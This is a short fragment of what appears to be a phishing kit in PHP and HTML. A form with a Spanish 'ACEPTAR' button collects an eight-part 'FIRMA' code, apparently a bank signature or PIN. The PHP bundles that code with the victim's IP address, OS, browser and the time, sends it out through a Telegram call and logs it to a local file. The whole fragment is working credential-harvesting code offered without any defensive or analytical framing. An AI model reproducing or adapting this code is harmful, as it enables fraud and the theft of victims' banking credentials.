...
if(isset($_POST['doSubmit']))
{
    ...
    $message = '/-- FIRMA --/' . getIPAddress() . "\r\n";
    $message .= '[FIRMA] = ' . $_POST['k1'] . $_POST['k2'] . $_POST['k3'] . $_POST['k4'] . $_POST['k5'] . $_POST['k6'] . $_POST['k7'] . $_POST['k8']. "\r\n";
    $message .= '[TIME/DATE] = ' . $date . "\r\n";
    $message .= '[IP address] = ' . getIPAddress() . "\r\n";
    $message .= '[OS] = ' . $user_os . "\r\n";
    $message .= '[BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('fucked/FIRMA.html', 'a');
...
<div class="cssload-container">
  <div class="cssload-zenith"></div>
    ...
    <div class="section">
      ...
      <button class="btn-firm2" type="submit" id="sBtn" name="doSubmit" class="btn btn-primary">ACEPTAR</button>
